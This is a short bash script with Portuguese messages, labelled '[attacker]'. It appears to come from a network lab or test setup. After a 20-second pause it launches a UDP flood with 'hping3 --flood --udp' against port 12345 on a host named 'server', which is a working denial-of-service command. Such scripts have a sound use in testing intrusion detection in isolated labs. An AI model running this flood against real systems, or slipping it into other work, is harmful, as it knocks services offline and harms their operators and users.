#!/bin/bash

echo "[attacker] Aguardando 20 segundos antes de iniciar o ataque..."
sleep 20

echo "[attacker] Iniciando ataque UDP realista com hping3..."
hping3 --flood --udp -p 12345 server
